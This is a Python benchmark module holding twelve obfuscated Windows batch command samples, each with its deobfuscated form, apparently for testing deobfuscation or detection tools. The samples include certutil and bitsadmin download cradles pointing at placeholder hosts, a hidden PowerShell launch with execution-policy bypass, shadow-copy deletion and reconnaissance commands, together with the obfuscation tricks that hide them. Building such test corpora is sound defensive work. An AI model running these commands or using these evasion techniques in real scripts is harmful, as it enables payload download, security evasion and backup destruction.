"""
Curated Benchmark Corpus of Real-World Batch Script Obfuscation Techniques.
Contains production-grade evaluation samples synthesized from Invoke-DOSfuscation,
0xidiz3r, Somalifuscator, download cradles, and living-off-the-land patterns.
"""

from dataclasses import dataclass, field
from typing import List, Optional, Dict


@dataclass
class BenchmarkSample:
    """Represents an obfuscated test case with ground-truth validation criteria."""
    sample_id: str
    name: str
    category: str
    raw_code: str
    expected_indicators: List[str]
    description: str
    expected_command: Optional[str] = None


BENCHMARK_CORPUS: List[BenchmarkSample] = [
    BenchmarkSample(
        sample_id="DOSFUSC_01_CARETS",
        name="Invoke-DOSfuscation Caret Masking",
        category="Invoke-DOSfuscation",
        raw_code=(
            'p^o^w^e^r^s^h^e^l^l.e^x^e -N^o^P^r^o^f^i^l^e '
            '-E^x^e^c^u^t^i^o^n^P^o^l^i^c^y B^y^p^a^s^s '
            '-W^i^n^d^o^w^S^t^y^l^e H^i^d^d^e^n -C^o^m^m^a^n^d "Write-Output Payload"'
        ),
        expected_indicators=[
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy Bypass",
            "-WindowStyle Hidden",
            "Write-Output Payload"
        ],
        expected_command='powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Write-Output Payload"',
        description="Classic argument and executable caret interleaving from Invoke-DOSfuscation."
    ),
    BenchmarkSample(
        sample_id="DOSFUSC_02_QUOTES",
        name="Empty Double-Quote Concatenation",
        category="Invoke-DOSfuscation",
        raw_code='c""m""d.e""x""e /c w""h""o""a""m""i /a""l""l',
        expected_indicators=["cmd.exe", "whoami", "/all"],
        expected_command="cmd.exe /c whoami /all",
        description="Empty double quotes injected between characters to break keyword signatures."
    ),
    BenchmarkSample(
        sample_id="DOSFUSC_03_ENV_SLICING",
        name="System Environment Variable Slicing",
        category="Invoke-DOSfuscation",
        raw_code='%COMSPEC:~-7,3% /c %COMSPEC:~-7,3%',
        expected_indicators=["cmd", "/c"],
        expected_command="cmd /c cmd",
        description="Dynamic resolution of executable names from %COMSPEC% using negative slice indices."
    ),
    BenchmarkSample(
        sample_id="DOSFUSC_04_BOOTSTRAP_CHAIN",
        name="Staged Dynamic SET Bootstrap Chain",
        category="Bootstrap Variable Staging",
        raw_code=(
            'set a1=s\n'
            '%a1%et a2=e\n'
            '%a1%%a2%t a3=t\n'
            '%a1%%a2%%a3% target=whoami /all\n'
            '%target%'
        ),
        expected_indicators=["whoami /all"],
        expected_command="whoami /all",
        description="Piecewise bootstrap reconstruction of the 'set' keyword and payload variables."
    ),
    BenchmarkSample(
        sample_id="OXIDIZ3R_05_NOISE_DEAD_CODE",
        name="0xidiz3r Dead Variable Interleaving",
        category="0xidiz3r Pattern",
        raw_code=(
            'set "noise1=93821039"\n'
            'set "p1=po"\n'
            'set "noise2=junk_token"\n'
            'set "p2=wer"\n'
            'set "p3=shell"\n'
            '%p1%%p2%%p3% -NoProfile -Command "dir"'
        ),
        expected_indicators=["powershell", "-NoProfile", "dir"],
        expected_command='powershell -NoProfile -Command "dir"',
        description="Interleaving dead assignment noise with piecewise variable fragments."
    ),
    BenchmarkSample(
        sample_id="SOMALI_06_SUBSTITUTION_CIPHER",
        name="Somalifuscator Substring Substitution",
        category="Somalifuscator Pattern",
        raw_code=(
            'set "cipher=cXYZmXYZd /c wXYZhXYZoXYZaXYZmXYZi"\n'
            '%cipher:XYZ=%'
        ),
        expected_indicators=["cmd /c whoami"],
        expected_command="cmd /c whoami",
        description="Character replacement cipher table eliminating delimiter sequences."
    ),
    BenchmarkSample(
        sample_id="STAGER_07_ENCODED_DOWNLOADER",
        name="Delayed Variable PowerShell Stager",
        category="Stager Loader",
        raw_code=(
            'set "bin=p^o^w^e^r^s^h^e^l^l"\n'
            'set "flag=-E^x^e^c^u^t^i^o^n^P^o^l^i^c^y B^y^p^a^s^s"\n'
            '!bin! !flag! -EncodedCommand ZQBjAGgAbwAgAEsARQWV'
        ),
        expected_indicators=["powershell", "-ExecutionPolicy Bypass", "-EncodedCommand"],
        expected_command="powershell -ExecutionPolicy Bypass -EncodedCommand ZQBjAGgAbwAgAEsARQWV",
        description="Delayed expansion combined with caret-masked executable invocation."
    ),
    BenchmarkSample(
        sample_id="CERTUTIL_08_DOWNLOAD_CRADLE",
        name="CertUtil Download Cradle with Carets",
        category="Download Cradle",
        raw_code=(
            'c^e^r^t""u""t""i""l.e^x^e -u^r^l^c^a^c^h^e -s^p^l^i^t -f '
            '"https://update.internal/bin" payload.bin'
        ),
        expected_indicators=["certutil.exe", "-urlcache", "-split", "-f", "payload.bin"],
        expected_command='certutil.exe -urlcache -split -f "https://update.internal/bin" payload.bin',
        description="Living-off-the-land download cradle obfuscated via hybrid carets and empty quotes."
    ),
    BenchmarkSample(
        sample_id="BITSADMIN_09_TRANSFER_DROPPER",
        name="BITSAdmin Multi-Level Caret Dropper",
        category="Transfer Dropper",
        raw_code=(
            'b^^^^i^^^^t^^^^s^^^^a^^^^d^^^^m^^^^i^^^^n '
            '/t^r^a^n^s^f^e^r myJob /d^o^w^n^l^o^a^d /p^r^i^o^r^i^t^y h^i^g^h '
            '"https://site.local/f" out.dat'
        ),
        expected_indicators=["bitsadmin", "/transfer", "/download", "/priority high"],
        expected_command='bitsadmin /transfer myJob /download /priority high "https://site.local/f" out.dat',
        description="Multi-tier carets and arguments configuring a background BITS download job."
    ),
    BenchmarkSample(
        sample_id="SHADOW_10_DELETION_SCRIPT",
        name="VSSAdmin Shadow Deletion Script",
        category="Service Shadow Query",
        raw_code='v^s^s^a^d^m^i^n d^e^l^e^t^e s^h^a^d^o^w^s /a^l^l /q^u^i^e^t',
        expected_indicators=["vssadmin", "delete shadows", "/all", "/quiet"],
        expected_command="vssadmin delete shadows /all /quiet",
        description="Caret-masked execution of shadow copy administrative utilities."
    ),
    BenchmarkSample(
        sample_id="MULTILAYER_11_COMPLEX_CHAIN",
        name="Multi-Layer Nested Obfuscation Chain",
        category="Multi-Layer Chain",
        raw_code=(
            'set "t=c^m^d"\n'
            'set "alph=abcdefghijklmnopqrstuvwxyz"\n'
            '%t% /c %alph:~22,1%%alph:~7,1%%alph:~14,1%%alph:~0,1%%alph:~12,1%%alph:~8,1% /a""l""l'
        ),
        expected_indicators=["cmd /c whoami /all"],
        expected_command="cmd /c whoami /all",
        description="Comprehensive combination of variable bootstrapping, slicing, carets, and quotes."
    ),
    BenchmarkSample(
        sample_id="LOTL_12_RECON_GATHERER",
        name="Living-off-the-Land Discovery Sequence",
        category="Living-off-the-Land",
        raw_code='i^p^c^o^n^f^i^g /a^l^l & n^e^t u^s^e^r & w^h^o^a^m^i /p^r^i^v',
        expected_indicators=["ipconfig /all", "net user", "whoami /priv"],
        expected_command="ipconfig /all & net user & whoami /priv",
        description="Chained system discovery commands obscured by caret masking across operators."
    )
]


def get_benchmark_corpus() -> List[BenchmarkSample]:
    """Returns the full suite of real-world benchmark evaluation samples."""
    return list(BENCHMARK_CORPUS)


def get_sample(sample_id: str) -> Optional[BenchmarkSample]:
    """Retrieves a specific sample by unique identifier."""
    for s in BENCHMARK_CORPUS:
        if s.sample_id.upper() == sample_id.upper():
            return s
    return None


def get_categories() -> List[str]:
    """Returns the unique categories present in the corpus."""
    cats = []
    for s in BENCHMARK_CORPUS:
        if s.category not in cats:
            cats.append(s.category)
    return cats
